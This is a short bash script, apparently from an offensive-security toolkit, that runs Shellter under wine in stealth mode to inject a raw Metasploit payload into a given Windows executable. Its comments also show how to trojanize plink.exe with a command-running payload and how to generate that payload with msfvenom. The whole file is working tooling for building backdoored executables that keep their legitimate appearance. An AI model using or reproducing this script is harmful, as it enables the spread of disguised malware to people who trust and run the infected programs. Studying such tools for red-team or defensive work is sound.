#!/bin/bash
# Backdoors the given windows executable using shellter, with the provided payload
# Note: payloads must be in raw format (Metasploit: generate -t raw)

if [ -z "$1" ] || [ -z "$2" ]; then
	echo "Usage: ./genshellter.sh <target exe> <payload>"
  exit 0
fi

EXE=$1
PAYLOAD=$2

echo "Infecting PE file $EXE..."
wine /usr/share/shellter/shellter.exe -a --stealth -f $EXE -p $PAYLOAD 

# Run windows cmd
#wine /usr/share/shellter/shellter.exe -a --stealth -f plink.exe -p winexec --cmd <command>

# Generate winexec payload using msfvenom:
# msfvenom -p windows/exec CMD="<command>" -f raw
